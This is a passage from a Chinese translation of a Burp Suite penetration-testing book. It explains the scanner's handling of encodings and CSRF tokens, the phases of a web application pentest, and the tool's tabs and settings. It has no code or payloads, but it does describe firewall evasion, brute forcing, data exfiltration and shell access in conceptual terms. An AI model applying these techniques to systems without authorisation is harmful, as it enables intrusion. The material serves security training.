![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/49559201-30d8-4aa8-83ec-55cf89b60920.png)

如果应用程序使用不同的编码，如 base64，Burp 会自动尝试检测正在使用的编码并相应地修改有效载荷：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/220ceb8c-6af1-44b6-b639-067641221ee9.png)

如果应用程序使用嵌套编码，Burp 会尝试检测此行为并相应地创建有效载荷，以帮助测试漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/4c85b5af-8dce-4c66-99b5-481c5f9b80b3.png)

还有我们之前讨论过的，Burp 通过尝试将参数传递到不同位置，如`POST`、`GET`请求，将值添加到头部，并对其进行模糊处理，来操纵参数的位置。这是为了绕过 Web 应用程序防火墙并尝试将参数发送到特定的应用程序功能：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/cec64ad6-fa35-4459-a1fa-75cceb967b30.png)

这些都是 Burp 用来帮助对应用程序进行扫描的不同样式和机制。这里的核心问题是，它如何扫描并维护有效的会话，如果额外的安全措施已经放置？好消息是，Burp 扫描器从根节点爬到每个请求，然后根据应用程序的上下文测试请求。

Burp Suite 在从节点到节点遍历时满足以下条件：

+   直接测试是否在 cookie 中存在令牌、相同的令牌或 CSRF

+   在单个 CSRF 令牌和单次使用令牌的情况下，从根节点到请求路径的遍历

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/17f652e9-b7fb-461f-b220-148c927ff3c7.png)

前面的图表显示了启发式爬行；如果您需要到达特定请求进行渗透测试，根节点有三个其他请求页面，Burp 将遍历所有这些页面并到达目标页面，就像模拟真实用户一样。这有什么帮助？这有助于测试使用每个请求 CSRF 令牌的严格应用程序。Burp 能够找出 CSRF 令牌的依赖关系，并通过从根节点遍历到目标请求并从响应中获取 CSRF，然后将其添加到下一个请求来执行高效的扫描，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/a6808c27-3efa-4d1c-8991-e1ec0e2fb6ce.png)

您可能还想知道如果应用程序超时，会如何管理会话处理，或者会话超时，甚至会话失效，对吗？Burp 管理一个时间轴。它会创建一个时间戳并验证会话是否仍然有效。一旦验证，它会设置一个标记并进行其他测试，然后，当涉及到超时条件或无效会话时，它会返回到先前的标记并重新开始测试，以便给我们一个准确的渗透测试结果，涵盖所有参数。可以从以下截图中了解相同的参考信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/8d80cce4-4cec-4cf1-8da2-ac7e014c73c5.png)

总之，扫描器会做以下几件事情：

+   它会自动管理额外的安全设置并执行模糊测试，比如处理 CSRF 令牌类型

+   它管理编码并相应地编辑攻击有效载荷

+   它甚至通过双重编码有效载荷执行嵌套模糊测试

+   它遵循基于快照的方法来执行扫描

+   它还确保参数从`POST`到`GET`进行模糊测试，甚至将它们推送到标头中，以尝试执行有效载荷

# 总结

这涵盖了 Burp 扫描器和爬虫的完整基础，让我们完全了解工具的工作方式，并在不同的 Web 应用程序场景中执行扫描，以给出准确的结果。现在，在下一章中，我们将开始进行应用程序渗透测试所需的阶段。


# 第四章：探索应用程序渗透测试的阶段

在本章中，我们将了解应用程序渗透测试涉及的阶段，并对 Burp Suite 工具进行广泛概述。基于这些知识，我们将枚举并收集有关我们目标的信息。

本章将涵盖以下主题：

+   应用程序渗透测试的阶段

+   更好地了解 Burp Suite

# 应用程序渗透测试的阶段

理解应用程序渗透测试的阶段是微不足道的，因为它奠定了基础，并确保渗透测试人员覆盖所有可能的端点并进行有效的扫描。Web 应用程序渗透测试通常分为以下阶段：

+   规划和侦察

+   客户端端代码分析

+   手动测试

+   自动化测试

+   利用发现的问题

+   深入挖掘数据外泄

+   获取外壳

+   报告

在这些阶段中，规划和侦察阶段是最重要的阶段，因为测试人员可能会错过应用程序的关键入口端点，并且这些区域可能会未经测试。让我们更详细地探讨一下发生了什么...

# 规划和侦察

在规划和侦察阶段，我们定义了渗透测试的范围。这个初始阶段需要大量的规划，您需要回答诸如：

+   渗透测试的范围是什么？

+   受限制的 URL 是什么？

+   范围内的各个子域是什么？

+   同一域中是否托管了多个应用程序，位于不同的文件夹中？

+   此应用程序是否在其他平台上托管（即移动应用程序，Web 应用程序，桌面应用程序等）

一旦您回答了这些问题，您将对应该测试什么和不应该测试什么有一些清晰的认识。根据是黑盒还是白盒测试，进一步的枚举将会发生。在任何一种情况下，我们都必须继续并发现范围内应用程序的所有文件和文件夹，并识别端点。稍后，在下一章中，我们将看到如何使用 Burp 发现新文件和文件夹。

# 客户端端代码分析

根据测试类型，我们也可以进行代码分析。对于作为白盒测试一部分托管的应用程序，整个代码将对测试人员可用，并且他可以使用自定义工具执行整个代码审查，并根据代码逻辑找到漏洞。假设它是黑盒，并且需要进行代码分析。在黑盒情况下，唯一进行的代码分析是客户端端代码和 JavaScript 库引用。根据分析，测试人员可以绕过这些脚本实施的某些验证逻辑，并使我们能够执行某些攻击。

在下一章中，我们将详细讨论如何通过代码操纵绕过客户端逻辑。...

# 手动测试

这是测试人员的头脑存在帮助他发现应用程序中各种漏洞的阶段。在这个阶段，攻击者通过模糊不同的输入字段并检查应用程序响应来手动测试漏洞。有时扫描程序无法找到某些漏洞，用户干预是非常必要的，这就是手动测试取得成功的地方。某些漏洞往往会被自动扫描器忽略，例如：

+   各种业务逻辑缺陷

+   二次 SQL 注入

+   渗透测试加密参数

+   权限提升

+   敏感信息披露

# 各种业务逻辑缺陷

每个应用程序都有自己的逻辑来完成一些功能。业务逻辑通常是完成工作所需的一系列步骤。让我们举个例子，如果用户想在购物网站上购买产品，他必须按照一系列步骤进行操作：

1.  选择一个项目

1.  指定产品的数量

1.  输入交付信息

1.  输入卡片详细信息

1.  完成支付网关程序

1.  购买完成

1.  交付待定

1.  交付完成

正如你所看到的，涉及很多步骤，这就是自动化扫描仪失败的地方。

# 二阶段 SQL 注入

SQL 二阶段工作方式不同；网页应用程序中的一个页面接受恶意用户输入，然后在另一个页面或另一个应用程序中的某个其他功能检索此恶意内容，并将其解析为查询的一部分。自动化扫描仪无法检测此类问题。然而，Burp 具有一个实现的逻辑，可以帮助攻击者发现 SQL 二阶段漏洞。

# 渗透测试加密参数

在信息被发送到第三方的应用程序中，比如从购物门户到支付网关的端点，比如信用卡详细信息，信息是通过双方同意的密钥加密的。自动化扫描仪将无法扫描这种情况。如果应用程序意外地暴露了任何端点，那么通过手动分析，渗透测试人员可以测试这些加密参数是否存在漏洞。

# 利用发现的问题

正如前面讨论的，一旦应用程序使用自动化扫描仪和手动测试进行扫描，然后就会进入这个阶段。发现的问题，如 SQL 注入文件上传绕过，XXE 攻击等，允许攻击者/测试者获得进一步挖掘并攻击应用程序以获取 shell 的能力。因此，一旦在这个阶段发现了问题，渗透测试人员将继续利用这些问题，以查看可以提取信息的程度。这是攻击者可以链接多个漏洞以查看是否可以引起更大漏洞的阶段。HackerOne 上有许多提交报告显示了测试人员如何链接多个漏洞，最终导致远程代码执行。

# 权限提升

自动化扫描仪不了解应用程序中可用角色或访问级别的知识，因此永远无法发现这些漏洞。因此，始终需要手动干预。

# 敏感信息泄露

自动化扫描仪的知识来确定信息是否敏感通常是通过一些关键词和正则表达式的组合来完成的，比如信用卡正则表达式或电话号码正则表达式。除此之外，都需要人工干预。

下一章将详细介绍如何进行手动分析。

# 自动化测试

自动化扫描是在网络和网络上进行的一个阶段。自动化扫描仪有助于发现从输入验证绕过到 SQL 注入等多个缺陷。自动化扫描需要加快多个发现的速度。在自动化扫描中，扫描仪模糊化所有输入参数，以找到 OWASP 前 10 名中的漏洞，特别是过时的插件和版本。它有助于找到敏感文件，比如根据其提供的字典找到管理员登录。应该注意，应用程序渗透测试不应该仅仅基于自动化扫描实践来得出结论。应该始终进行手动干预来验证发现。很多时候...

# 深挖数据外泄

有时用户无法获取 shell，或者可能出现应用程序可能容易受到盲目 SQL 或 XXE 攻击的情况；那么现在该怎么办呢？嗯，在这种情况下，攻击者仍然可以尝试使用带外技术或简单技术来外泄信息。使用这些技术，攻击者可以外泄大量信息，比如从数据库中提取用户凭据，通过 XXE 注入读取文件等。在后面的章节中，我们将看到如何使用 Burp 的带外技术进行数据外泄。

# 获取 shell

好吧，这是所有渗透测试人员最喜欢的部分，当他们对渗透测试活动感到满意时。一旦测试人员通过任何漏洞（如 SQL、RFI、文件上传、LFI 等）获得了 shell，他就可以尝试看看自己是否能够提升在服务器上的权限。如果他能够成为系统或根用户，那么这就是完全的妥协，测试可以被认为是完全成功的。

# 报告

一旦测试完成，接下来就是最重要的阶段：报告。报告必须尽可能准确和详细地进行，以向组织解释漏洞及其影响。这是因为组织只会通过提交的报告来理解测试人员的努力。您还可以添加测试的攻击以及应用程序如何防御这些攻击，让组织/开发人员了解应用程序的强大程度。

# 更好地了解 Burp Suite

在本节中，我们将看一下 Burp Suite 为测试人员提供的丰富功能和能力。我们还将看一下帮助自动化整个渗透测试过程的快速修复功能，以减少误报的数量。这将帮助初学者了解 Burp 在 Web 应用程序渗透测试方面的强大功能。

# Burp Suite 的特性

Burp Suite 有各种选项，可以让我们有效地进行渗透测试。一旦打开 Burp Suite，您会看到以下选项卡：

+   仪表板

+   目标

+   代理

+   入侵者

+   重复器

+   顺序器

+   解码器

+   比较器

+   扩展器

+   项目选项

+   用户选项

这是 Burp Suite 上的样子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/2c08205f-b5f6-47f5-844a-6f060735e6fb.png)

让我们逐一了解所有这些选项，以便在以后的章节中进行渗透测试时，我们能够充分了解这些功能。

# 仪表板

Burp Suite 仪表板分为以下三个部分：

+   任务

+   问题活动

+   咨询

+   事件日志

这使用户可以完全了解在测试人员运行自动扫描时发生了什么。仪表板看起来像下面的截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/5560f55b-f30f-4d11-982d-ad065d4641ef.png)

在任务选项中，测试人员可以点击“新扫描”并指定要扫描的网站。除了网站名称，还有其他选项，如配置扫描设置。一旦点击“新扫描”按钮，你会看到一个像这样的屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/2f4e4f14-5787-49d6-a954-20925a08f49d.png)

...

# 目标

**目标**选项卡允许您查看在范围内的应用程序的整个站点地图。它向用户显示了应用程序上检测到的所有文件夹和文件以及构建逻辑。目标选项卡还有许多其他功能。映射可以通过两种方式进行；一种是手动浏览，另一种是通过自动爬虫。如果测试人员正在进行手动浏览，请关闭代理拦截并浏览应用程序。随着不同页面的请求和响应不断在 Burp Suite 中出现，目标选项卡会显示检测到的结构。这使用户可以了解应用程序的外观以及整个应用程序中的文件夹和文件命名约定。嗯，正如我们所知，对于一个有很多页面的大型网站，使用自动爬虫是最合适的选择，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/a04159ef-0d7e-4e41-8040-07358a8df842.png)

您可以在目标选项卡中看到有三个子部分，**站点地图**，**范围**和**问题定义**。让我们看看**范围**选项卡提供了哪些功能。**范围**选项卡提供了两个关键功能；一个是要包含在范围内的 Web URL，另一个是要从范围中排除的 Web URL。

在这里，测试人员可以输入 Web URL 的特定文件夹，或者如果范围是主 URL，则可以输入整个 URL 本身。例如，假设要测试的应用程序位于[www.website.com/pentesting/](http://www.website.com/pentesting/)，那么范围可以限制在 pentesting 文件夹中。如果是整个网站，那么可以输入网站名称本身，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/55e4c952-40ed-43a2-ab50-fe5c2241e15f.png)

要添加 URL，只需单击**添加**，然后输入 URL 或带有文件夹路径的 URL。用户单击**添加**后，将看到以下屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/0fc9d353-4e37-4e96-8bd5-af4b8d5080c8.png)

同样，**从范围中排除**可以确保不会向**从范围中排除**的 URL 发送任何测试或额外的请求。当应用程序中存在可能是敏感页面的某些文件夹时，这是有效的，例如忘记密码功能或注册功能。

在生产环境中进行测试时，如果包括在测试中，那么将会有大量的垃圾信息，清除这些信息将是繁琐的，客户也不会欣赏。因此，请确保使用此功能。另一种方法是右键单击特定文件，然后选择是否要将其排除或包括在范围内。例如，如果需要将某些内容包括在范围内，可以按照下面的屏幕截图所示进行操作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/c63a37fa-1a4d-455c-baf2-97fd23192a19.png)

如果您需要从范围中排除特定路径或文件，可以通过右键单击 URL 并选择**从范围中删除**来完成，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/b85aedb0-d985-4cea-aa21-b1c5026c5a6a.png)

还有一个高级范围控制功能。当您在范围选项卡中启用它时，它可以让您输入协议类型，即 HTTP 或 HTTPS，然后是 IP/IP 范围，以及端口号和文件，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/52c14aef-fe74-4e40-ab45-4bf5259683db.png)

问题定义包含 Burp 可以检测到的所有漏洞的定义。这让我们对 Burp Suite 发现如此多漏洞的丰富检测能力有了很好的了解，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/433bff9c-a1e3-4cbf-b52e-6dbdf11194c5.png)

Burp 还在站点地图中提供了过滤器，确定要显示什么和需要隐藏什么。例如，请求应该如何过滤，然后显示的 MIME 类型，然后是状态代码。还有其他选项，例如按搜索词、按扩展名和按注释进行过滤。这些都很容易理解，并且可以根据用户的要求进行配置，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/b80d3466-2e58-48bd-b4cd-fc562afb2b08.png)

这有助于清晰地了解站点地图。

# 代理

这是整个工具的核心；Burp Suite 上发生的一切都是通过这个地方进行的。代理选项卡允许您拦截请求并通过编辑和发送到重复器、入侵者或任何 Burp 测试模块来进行操作。这是您可以决定测试人员想要对请求做什么的地方。**代理**选项卡如下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/ee58d178-af24-4e0d-8295-e36300ca1c50.png)

拦截请求后，可以以不同的方式查看。对于简单的 HTTP 请求，可用的选项包括原始、参数、标头和十六进制。根据请求的类型，如果是 Web 套接字请求，则会有一个 Web 套接字选项卡...

# 入侵者

这是应用程序的核心功能。Burp 的这一功能允许用户自动执行用户想要的过程。自动化用于对 Web 应用程序执行攻击。这一功能非常可定制，可用于各种任务，从暴力破解到利用 SQL 注入和操作系统命令注入等。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/fca804ba-a9fd-45b2-a39b-8a5ec7df8c27.png)

Intruder 有四个子标签，分别是：

+   **Target**

+   **Positions**

+   **Payloads**

+   **Options**

**Target**标签显示了请求发送到的 IP 和端口，以及**Start attack**按钮。这个按钮被点击一次，为要测试的特定请求进行设置，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/792a5c3e-116d-4000-8ff5-a1bd84416d5f.png)

**Positions**标签在**Intruder**中用于选择有效载荷位置。如下截图所示，`txtUsername`和`txtPassword`的**Value**参数被突出显示。**Add**按钮添加分隔符；两个分隔符之间的任何内容都成为一个攻击点。如我们在示例请求中看到的，自动化需要完成的地方有两个。**Clear**按钮从请求中删除所有注入点，**Auto**按钮添加 Burp 突出显示的所有可攻击的参数。

这个标签中最有趣的是攻击类型。Burp 支持四种不同的攻击类型：

+   **Sniper**

+   **Battering Ram**

+   **Pitchfork**

+   **Clusterbomb**

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/cb690b42-67e4-4a18-be99-6a764fdb1189.png)

让我们更详细地了解一下攻击类型。

**狙击手**：狙击手支持单一组有效载荷。它将一次发送一个有效载荷。所以假设我们希望对一个位置进行模糊测试，那么狙击手是最适合进行攻击自动化的。它不适用于两个攻击点，因为狙击手只会向第一个攻击点发送一个有效载荷。一旦有效载荷集用尽，它将把有效载荷发送到第二个攻击点，将第一个点保留为默认值。狙击手总是用于单一输入攻击点。如果我们在前面的截图中使用狙击手，它将首先对用户名进行模糊测试，将密码保持为`admin`，然后对密码字段进行模糊测试，将用户名字段保持为默认值，即 admin。

**Battering Ram**：Battering Ram 也使用单一组有效载荷。这里有趣的是 Battering Ram 会在多个位置传递相同的有效载荷。这意味着一旦有效载荷列表被指定，它将在所有需要进行模糊测试的标记位置发送第一个有效载荷值，以此类推，直到最后一个有效载荷。生成的有效载荷数量等于提供的有效载荷数量，而不管模糊测试的位置如何。

**Pitchfork**：此攻击使用多组有效载荷。假设我们已经标记了两个模糊测试的位置，类似于前面的截图，并且给出了两组有效载荷；一个是用户名，另一个是密码。当攻击开始时，有效载荷集中的第一个有效载荷被设置在第一个位置，第二个有效载荷集中的第一个有效载荷被设置在第二个位置，攻击随之增加。攻击的总次数将等于有效载荷集中有效载荷最少的数量。

**ClusterBomb**：此攻击使用多组有效载荷。它是所有有效载荷位置的完全排列组合。假设有两个有效载荷位置，用户名和密码，以及两个不同的有效载荷集，用户名集和密码集。攻击发生的方式是，位置 1 的第一个有效载荷与位置 2 的所有有效载荷集一起测试。一旦用尽，那么第二个有效载荷将设置在位置 1，并且所有第二组有效载荷将针对它进行测试。因此，总共生成的请求数量将是有效载荷集中有效载荷数量的乘积。假设我们对位置 1 有 10 个有效载荷，对位置 2 有 10 个有效载荷：将发送的请求总数将是 100。

接下来的标签是**Payloads**标签。它包含四种不同的设置，分别是：

+   **Payload Sets**

+   **Payload Options**

+   **Payload Processing**

+   **Payload Encoding**

**负载集**：**负载集**允许您指定在哪个负载位置输入什么类型的负载。

**负载选项**：此设置允许您设置负载。测试人员可以从可用的 Burp 列表中设置，如果是专业版，否则可以使用**加载...**选项加载自定义文件集，如下图所示

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/b753aa4a-1664-48fc-85af-1663bb39f97a.png)

**负载处理**：此设置允许用户在使用每个负载之前执行不同的任务。在开始攻击之前可以配置规则，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/3fa0e2dc-b46d-4519-86dc-c29996432969.png)

**负载编码**：此设置允许将自动编码设置为打开或关闭，并借助复选框。用户可以指定在发送到测试时需要对其进行 URL 编码的字符，根据正在测试的应用程序的依赖性，例如：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/7d955a60-36a5-48a8-9b66-dd19d89c3502.png)

最后一个选项卡是**选项**选项卡，允许测试人员配置攻击自动化的其他设置。它包含以下设置：

+   **请求头**

+   **请求引擎**

+   攻击结果

+   **Grep 匹配**

+   **Grep 提取**

+   **Grep 负载**

+   重定向

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/68d074c8-c8aa-4c37-8800-6ff61c93e9b5.png)

**请求头**：此设置允许用户根据负载的长度自动**更新 Content-Length 头**，并设置**Set Connection: close**的头，以便不通过将其置于等待状态来利用应用程序的资源。

**请求引擎**：请求引擎允许用户通过指定要使用的线程数、在网络故障时要进行的重试次数、暂停、节流等来控制测试速度，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/d90564fc-08d7-4543-a9b4-20b70e098ec9.png)

攻击结果：此设置允许测试人员根据攻击结果选择要捕获的信息。

**Grep-Match**：此设置允许用户突出显示某些字段，以快速查看特定表达式的调用。例如，如果用户成功登录，则会有注销选项，因此如果用户在此处添加表达式注销并启用此设置，那么请求将被突出显示并易于发现，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/5413ccbe-5a87-45f8-a21e-438cde505812.png)

Grep 负载：此设置用于标记包含与提交的负载相同值的结果。

**重定向**：此设置告诉 Burp 在发送请求时检测到重定向时该做什么。

# **Repeater**

**Repeater**允许测试人员通过对其进行修改并检查服务器响应来递归地提交相同的请求。假设测试人员正在测试特定请求的一个参数上的 SQL 注入或命令注入漏洞。测试人员可以在**代理**中捕获请求并将其发送到**Repeater**，操纵参数并将其发送到服务器以检查响应，然后再次操纵它并检查响应。这就像一个手动调试器。查看以下屏幕截图，以清楚了解第一个请求，即一个简单的登录请求：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/88fd12f6-1c19-468e-aa23-e7955ed9747e.png)

它以**OK**作为响应。但是，如果我更改用户名的值...

# 比较器

Burp Comparer 是 Burp 的一个功能，用于基于单词或字节比较的差异比较。比较可以在许多条件下使用。例如，假设用户想要比较成功和失败的登录响应之间的差异。比较器将显示字节差异的区域。我们可以想到的另一个用途是用于测试 SQL 注入以查看差异。有两种类型的比较。要将响应发送到比较器，只需右键单击响应，然后选择“发送到比较器”。参考以下截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/8ce39d9b-aeef-49ce-8059-a9a8c12557ea.png)

为了澄清，我们已将两个不同的响应发送到比较器：一个是成功登录，另一个是失败登录。**比较器**工具栏将如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/59e39ceb-a268-4e2b-a7d8-03fd5e12dabc.png)

测试人员可以从项目 1 中选择一个响应，从项目 2 中选择另一个响应，然后点击“按单词比较”和“按字节比较”。该工具将进行单词对单词的比较，并显示删除、修改和添加等差异，例如：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/1829a014-2a63-4800-9068-680cd6abcd22.png)

比较以颜色编码的方式显示，如前面截图中所示的**修改**、**删除**和**添加**。

# Sequencer

**Sequencer**用于分析会话 cookie、CSRF 令牌和密码重置令牌的随机性。当我们使用**Sequencer**对**会话**令牌进行分析时，我们将更详细地讨论这一点。

有关 Burp Suite Sequencer 的更多信息，请访问[`www.preflexsol.com/burpsuite.shtml`](http://www.preflexsol.com/burpsuite.shtml)

# 解码器

这个 Burp 实用程序允许测试人员在应用程序中遇到数据时对其进行编码、解码和哈希处理。支持不同类型的编码器和哈希，例如：

| 编码器/解码器 | 明文 | URL | HTML | Base64 | ASCII 十六进制 | 十六进制 | 八进制 | 二进制 | Gzip |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

以下是使用解码器中的**编码为...**选项对字符串密码进行 base64 编码的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/8ff81d80-678f-4a44-9ff8-e23883e50cb5.png)

支持多种类型的哈希，从 SHA 到 SHA3-512，然后是 MD5、MD2 等。尝试使用解码器，它在渗透测试中将是一个非常方便的实用工具。

# 扩展程序

Burp 的这一功能允许测试人员使用独立开发的不同扩展，作为 Burp 功能的附加功能。Burp 非常可扩展；用户甚至可以编写自己的代码来创建 Burp 扩展，并将其嵌入以更充分地利用 Burp。为了充分利用这些扩展，用户必须提供 Jython 和 JRuby JAR 文件的路径。我们很快将看到如何做到这一点。让我们看看以下 Burp Extender 页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/cb75cfe3-6930-4a4f-8968-df53df88a0da.png)

在 Extender 部分，转到**选项**页面，并提供下载的 Jython JAR 文件的路径。可以从[`www.jython.org/downloads.html ...`](http://www.jython.org/downloads.html)下载 Jython JAR。

# 项目选项

项目选项类似于用户选项，但此选项卡特定于已启动的特定项目。它包含以下子选项卡：

+   **连接**

+   **HTTP**

+   **SSL**

+   **会话**

+   **其他**

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/053d8a03-d0e8-4926-8474-d7571f32e73e.png)

**连接**选项卡包含以下项目列表：

+   **平台认证**

+   **上游代理服务器**

+   **SOCKS 代理**

+   **超时**

+   **主机名解析**

+   ****超出范围的请求****

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/cac0edbd-4707-439d-9d27-e3806e447486.png)

**平台认证**: **平台认证**包括通常在用户访问应用程序之前存在的认证（例如，HTTP 认证、NTLMv1、NTLMv2 认证、摘要认证等）。因此，如果在**用户选项**选项卡中未进行配置，则可以在此处使用设置。我们将在**用户选项**菜单中详细了解可用的不同选项。

**上游代理服务器**: 假设在一个组织中，需要配置代理才能访问特定应用程序。然而，由于我们将流量重定向到 Burp 作为我们的代理，用户如何将请求重定向到组织代理通过特定应用程序？这就是上游代理服务器发挥作用的地方。上游代理服务器允许您配置组织的代理，以便请求可以发送到代理后面的特定应用程序。

**超时**: 在进行测试时，Burp 发送了许多请求到应用程序。但是它如何理解请求是否已经完成，是否应该等到服务器响应，或者如果服务器无法访问，或者对于某些特定请求响应不可用会怎么样？Burp 用于测试的所有线程可能最终会被利用并处于等待状态。因此，超时功能允许用户根据情况指定何时终止特定请求。如下截图所示，有四种不同类型的超时。普通、无限期响应、域名解析和失败的域名解析：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/35733913-3fa7-426a-89b3-346370d309fb.png)

**主机名解析**: 假设有一种情况，用户想要为托管在特定 IP 上的特定应用程序提供别名。通常 DNS 解析发生在主机文件或 DNS 服务器级别。Burp 还允许用户指定这样的能力，用户可以在此配置中说`127.0.0.1`解析为 pentest，当用户输入`http://pentest/`时，将显示本地主机内容。这种配置可以在**主机名解析**页面中完成。

**超出范围的请求**: Burp 提供了一个功能，可以阻止 Burp 发出任何超出范围的请求。提供的两个功能是丢弃所有超出范围的请求或使用**目标**选项卡中定义的范围。

**HTTP**选项卡中的下一个子选项卡是**HTTP**。如果在用户选项部分尚未配置，则包含所有与 HTTP 相关的设置。**HTTP**选项卡如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/a8e75cce-71f9-4239-81f4-1ed7c56d5423.png)

**HTTP**选项卡包含以下三个设置：

+   **重定向**

+   **流式响应**

+   **状态 100 请求**

**重定向**: 在 Burp 中，这些设置允许 Burp 考虑和相应地处理的重定向类型。

**流式响应**: 这些设置用于指定返回无限期响应的 URL。Burp 将直接将这些响应传递给客户端。

**状态 100 响应**: 通过此设置，用户可以控制 Burp 处理带有状态 100 的 HTTP 响应的方式。用户可以选择理解响应 100，或者删除 100 继续头。

下一个选项卡是**SSL**选项卡。在这里，可以设置特定项目的所有与 SSL 相关的配置，如果在**用户选项**选项卡中尚未配置，例如：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/9ac68b05-9cda-40f7-8307-98eecdebf4d7.png)

以下三个选项可用：

+   **SSL 协商**

+   **客户端 SSL 证书**

+   **服务器 SSL 证书**

**SSL 协商**：用户经常因为**SSL 协商**错误而无法看到应用程序。在这里，用户可以指定特定的协商，手动指定要使用的密码。如果单击“使用自定义协议和密码”，用户将获得所有可用密码的列表，然后可以取消选择导致错误的密码，然后访问应用程序，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/6375465d-1c60-4dac-86d1-8d0586de32d7.png)

如果仍然无法工作，那么也有可用的解决方法。用户可以选择在协商失败时自动选择兼容的 SSL 参数，或允许使用重新协商，甚至禁用 SSL 会话。

**客户端 SSL 证书**：有时应用程序需要特定的证书，否则无法呈现应用程序内容。这些也称为客户端 SSL 证书。Burp 提供了一个功能，用户可以添加客户端证书，以便每当主机请求时，可以将其发送到主机。**客户端 SSL 证书**选项卡如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/0517e814-4915-4c79-a922-55899dce2f76.png)

**服务器 SSL 证书**：此面板显示从 Web 服务器接收的唯一 SSL 证书的列表。可以双击该项目以查看整个证书。

接下来是**会话**选项卡，它处理特定项目的所有与会话相关的信息。**会话**选项卡中有三种不同的设置，如下所示：

+   **会话处理规则**

+   **Cookie Jar**

+   **宏**

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/b6624e5b-f274-42f9-a72c-93b08a2d2d35.png)

**会话处理规则**：会话规则允许用户为每个 HTTP 请求让 Burp 执行某些任务。每个规则都有一个定义的范围，用户点击**会话处理规则**设置的**添加**按钮后，定义就可用。可以执行许多操作，例如添加会话 cookie，登录应用程序，检查会话有效性等。以下屏幕截图显示了会话处理规则中可用的定义：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/a98be63c-1df5-4a4d-a5ba-e44c475053d2.png)

**Cookie jar**：Burp 将网站发出的所有 cookie 存储在 cookie jar 中。会话处理规则利用这些 cookie，甚至更新它们以维持与应用程序的有效会话。在这里，测试人员可以选择从哪里获取和维护所有 cookie，即**代理**，**扫描器**，**重复器**，**入侵者**，**顺序器**和**扩展器**。

**宏**：简单来说，宏就像是一个以上请求的一系列序列。它们可以在会话处理中使用，或者执行诸如获取反 CSRF 令牌之类的操作。当我们谈论 Burp 及其宏时，我们将更详细地了解这一点。

